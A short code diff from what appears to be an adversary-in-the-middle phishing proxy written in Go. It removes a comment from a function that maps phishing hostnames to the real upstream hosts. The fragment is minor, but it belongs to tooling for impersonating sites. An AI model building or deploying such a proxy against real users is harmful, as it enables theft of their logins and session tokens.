@@ -27,7 +27,6 @@ func (h *URLRewriter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
 	return nil
 }
 
-// resolveOrigHost maps a phishing hostname back to the real upstream hostname.
 func resolveOrigHost(def *aitm.PhishletDef, cfg *aitm.PhishletConfig, phishHost string) string {
 	lowerPhishHost := strings.ToLower(phishHost)
 	for _, proxyHost := range def.ProxyHosts {
